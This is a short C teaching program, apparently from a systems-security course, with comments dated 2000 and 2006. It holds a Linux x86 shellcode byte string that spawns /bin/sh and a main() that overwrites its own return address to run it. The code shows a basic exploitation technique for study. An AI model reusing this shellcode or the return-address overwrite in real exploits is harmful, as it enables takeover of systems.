/* this program points the return address of main to some shell code (shell2.c)
 *
 * Written by: JiM Strassburg 02/03/2000
 * Updated by: Eric Durant 5/5/2006: Added comment noting that this
 *   code also runs on Ubuntu 5.04 -  code image comes from
 *   from building shell1.s and then modifying assembly so that machine code does not contain NULLs
 */


/* Original version by Strassburg for Red Hat 6, also works on Ubuntu 5.04 */
char shellCode[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
	"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d"
	"\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80"
	"\xe8\xdc\xff\xff\xff/bin/sh";

int main()
{
  int* returnAddr; /* main's return address */
  returnAddr = (int*)&returnAddr + 2; /* point at main's ret addr */
  (*returnAddr) = (int)shellCode; /* point it at the shell code */
  return 0;
}
